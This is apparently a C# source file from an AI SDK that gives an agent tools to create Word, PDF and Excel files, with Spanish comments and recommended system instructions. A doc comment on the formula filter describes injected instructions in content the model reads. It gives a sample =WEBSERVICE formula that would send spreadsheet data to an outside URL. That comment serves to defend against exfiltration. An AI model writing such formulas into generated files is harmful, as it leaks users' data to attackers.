using System.ComponentModel;
using System.Text.Json;
using AiSdk.Artifacts;

namespace AiSdk.Documents.Generation;

/// <summary>Atajos para generar documentos.</summary>
public static class DocumentGenerator
{
    public const string DocxMediaType = MediaTypes.Docx;
    public const string XlsxMediaType = MediaTypes.Xlsx;
    public const string PdfMediaType = MediaTypes.Pdf;

    /// <summary>Markdown → Word.</summary>
    public static byte[] ToDocx(string markdown, DocumentStyleOptions? options = null) => DocxWriter.FromMarkdown(markdown, options);

    /// <summary>Markdown → PDF.</summary>
    public static byte[] ToPdf(string markdown, DocumentStyleOptions? options = null) => PdfWriter.FromMarkdown(markdown, options);

    /// <summary>Tablas Markdown → Excel (una hoja por tabla). Los textos que parecen fórmulas se escriben como texto.</summary>
    public static byte[] ToXlsx(string markdownTables, SheetOptions? options = null) =>
        new SpreadsheetBuilder().AddMarkdownTables(markdownTables, options).Build();

    /// <summary>Objetos → Excel. Los textos que parecen fórmulas se escriben como texto.</summary>
    public static byte[] ToXlsx<T>(IEnumerable<T> items, string sheetName = "Datos", SheetOptions? options = null) =>
        new SpreadsheetBuilder().AddSheet(sheetName, items, options).Build();
}

/// <summary>Opciones de <see cref="DocumentTools"/>.</summary>
public sealed class DocumentToolOptions
{
    /// <summary>Dónde se guardan los archivos (también aparecen como artifacts en la UI).</summary>
    public required IArtifactStore Store { get; init; }

    /// <summary>URL pública y otras opciones de artifacts (p. ej. <c>Url = a => $"/artifacts/{a.Id}"</c>).</summary>
    public ArtifactToolOptions ArtifactOptions { get; init; } = new();

    /// <summary>Estilo base (fuente, colores, tamaño de papel, encabezado...).</summary>
    public DocumentStyleOptions Style { get; init; } = new();

    /// <summary>Formatos habilitados.</summary>
    public bool Word { get; init; } = true;

    public bool Pdf { get; init; } = true;

    public bool Excel { get; init; } = true;

    /// <summary>
    /// Permite que <c>create_spreadsheet</c> escriba fórmulas (por defecto true, filtradas con <see cref="FormulaFilter"/>):
    /// el modelo puede escribir <c>=B2*C2</c> o <c>=SUM(B2:B9)</c>. False escribe todo como texto.
    /// </summary>
    public bool AllowFormulas { get; init; } = true;

    /// <summary>
    /// Fórmulas del modelo que se escriben como tales (por defecto <see cref="SpreadsheetBuilder.IsSafeFormula"/>: solo
    /// funciones de cálculo, sin red, enlaces, DDE ni otros libros); las demás quedan como texto. El contenido que el
    /// modelo lee (páginas, correos, documentos) puede inyectarle instrucciones, y una fórmula como
    /// <c>=WEBSERVICE("https://...?"&amp;A1)</c> filtraría datos cuando el usuario abra el archivo. Null admite cualquiera.
    /// </summary>
    public Func<string, bool>? FormulaFilter { get; init; } = SpreadsheetBuilder.IsSafeFormula;
}

/// <summary>
/// Herramientas para que un agente genere archivos Word, PDF y Excel descargables. El agente escribe
/// Markdown (o datos tabulares) y el SDK produce el archivo con estilos profesionales, lo guarda como
/// artifact y lo anuncia a la interfaz (<c>data-artifact</c>).
/// </summary>
public static class DocumentTools
{
    /// <summary>Instrucciones de sistema recomendadas.</summary>
    public const string Instructions =
        """
        Puedes generar archivos descargables: create_word_document y create_pdf a partir de Markdown
        (títulos #, listas, tablas, **negrita**, citas, bloques de código y \pagebreak para saltos de página),
        y create_spreadsheet con hojas, columnas tipadas (text, number, integer, currency, percent, date, boolean)
        y filas de datos; los textos que empiezan con "=" son fórmulas de Excel (p. ej. "=B2*C2" o "=SUM(D2:D9)"),
        solo con funciones de cálculo (no enlaces ni funciones de red, que se escriben como texto).
        Escribe contenido completo y bien estructurado. Después de generar, entrega el enlace y un resumen breve.
        """;

    public static IReadOnlyList<Tool> Create(DocumentToolOptions options)
    {
        var tools = new List<Tool>();

        async Task<object> SaveAsync(byte[] data, string fileName, string extension, string mediaType, string? title, ToolExecutionContext ctx, CancellationToken ct)
        {
            fileName = Path.GetFileNameWithoutExtension(string.IsNullOrWhiteSpace(fileName) ? title ?? "documento" : fileName);
            fileName = string.Concat(fileName.Split(Path.GetInvalidFileNameChars())) + extension;
            var artifact = await ArtifactTools.SaveFileAsync(options.Store, data, fileName, mediaType, title, ctx, options.ArtifactOptions, ct).ConfigureAwait(false);
            return new { id = artifact.Id, fileName, size = data.Length, version = artifact.Version, url = options.ArtifactOptions.Url?.Invoke(artifact) };
        }

        DocumentStyleOptions Style(MarkdownDocumentInput input) => new()
        {
            Title = input.Title ?? options.Style.Title,
            Subtitle = input.Subtitle ?? options.Style.Subtitle,
            Author = options.Style.Author,
            TitlePage = input.TitlePage ?? options.Style.TitlePage,
            Landscape = input.Landscape ?? options.Style.Landscape,
            PaperSize = options.Style.PaperSize,
            MarginCm = options.Style.MarginCm,
            FontFamily = options.Style.FontFamily,
            FontSize = options.Style.FontSize,
            AccentColor = options.Style.AccentColor,
            HeaderText = options.Style.HeaderText,
            PageNumbers = options.Style.PageNumbers,
            Language = options.Style.Language,
            PdfFonts = options.Style.PdfFonts,
        };

        if (options.Word)
        {
            tools.Add(Tool.Create<MarkdownDocumentInput, object>(
                "create_word_document",
                "Genera un documento Word (.docx) editable a partir de Markdown.",
                (input, ctx, ct) => SaveAsync(DocxWriter.FromMarkdown(input.Markdown, Style(input)), input.FileName, ".docx", DocumentGenerator.DocxMediaType, input.Title, ctx, ct)));
        }

        if (options.Pdf)
        {
            tools.Add(Tool.Create<MarkdownDocumentInput, object>(
                "create_pdf",
                "Genera un PDF a partir de Markdown (informes, cartas, contratos, cotizaciones).",
                (input, ctx, ct) => SaveAsync(PdfWriter.FromMarkdown(input.Markdown, Style(input)), input.FileName, ".pdf", DocumentGenerator.PdfMediaType, input.Title, ctx, ct)));
        }

        if (options.Excel)
        {
            tools.Add(Tool.Create<SpreadsheetInput, object>(
                "create_spreadsheet",
                "Genera un archivo Excel (.xlsx) con una o más hojas, columnas tipadas, formatos, filtros y totales.",
                (input, ctx, ct) =>
                {
                    var builder = new SpreadsheetBuilder
                    {
                        Title = input.Title,
                        Author = options.Style.Author,
                        AccentColor = options.Style.AccentColor,
                        AllowFormulas = options.AllowFormulas,
                        FormulaFilter = options.FormulaFilter,
                    };
                    foreach (var sheet in input.Sheets)
                    {
                        builder.AddSheet(
                            sheet.Name,
                            sheet.Columns.Select(c => new SheetColumn(c.Header, c.Type ?? ColumnType.Auto, c.Format)).ToList(),
                            sheet.Rows.Select(r => (IReadOnlyList<object?>)r.Select(v => (object?)v).ToList()),
                            new SheetOptions { Totals = sheet.Totals ?? false });
                    }

                    return SaveAsync(builder.Build(), input.FileName, ".xlsx", DocumentGenerator.XlsxMediaType, input.Title, ctx, ct);
                }));
        }

        return tools;
    }

    private sealed record MarkdownDocumentInput(
        [property: Description("Nombre del archivo sin extensión, p. ej. informe-ventas-q3.")] string FileName,
        [property: Description("Contenido completo en Markdown.")] string Markdown,
        [property: Description("Título del documento.")] string? Title = null,
        [property: Description("Subtítulo (portada).")] string? Subtitle = null,
        [property: Description("Agrega una portada con título, subtítulo y fecha.")] bool? TitlePage = null,
        [property: Description("Orientación horizontal (tablas anchas).")] bool? Landscape = null);

    private sealed record ColumnInput(
        [property: Description("Encabezado de la columna.")] string Header,
        [property: Description("Tipo: auto, text, number, integer, currency, percent, date, dateTime o boolean.")] ColumnType? Type = null,
        [property: Description("Formato Excel opcional, p. ej. \"#,##0.00\" o \"dd/mm/yyyy\".")] string? Format = null);

    private sealed record SheetInput(
        [property: Description("Nombre de la hoja (máx. 31 caracteres).")] string Name,
        [property: Description("Columnas en orden.")] IReadOnlyList<ColumnInput> Columns,
        [property: Description("Filas: arrays con un valor por columna (números como número, fechas ISO yyyy-MM-dd, fórmulas de cálculo con =).")] IReadOnlyList<IReadOnlyList<JsonElement>> Rows,
        [property: Description("Agrega fila de totales con SUM en columnas numéricas.")] bool? Totals = null);

    private sealed record SpreadsheetInput(
        [property: Description("Nombre del archivo sin extensión.")] string FileName,
        [property: Description("Hojas del libro.")] IReadOnlyList<SheetInput> Sheets,
        [property: Description("Título del libro.")] string? Title = null);
}
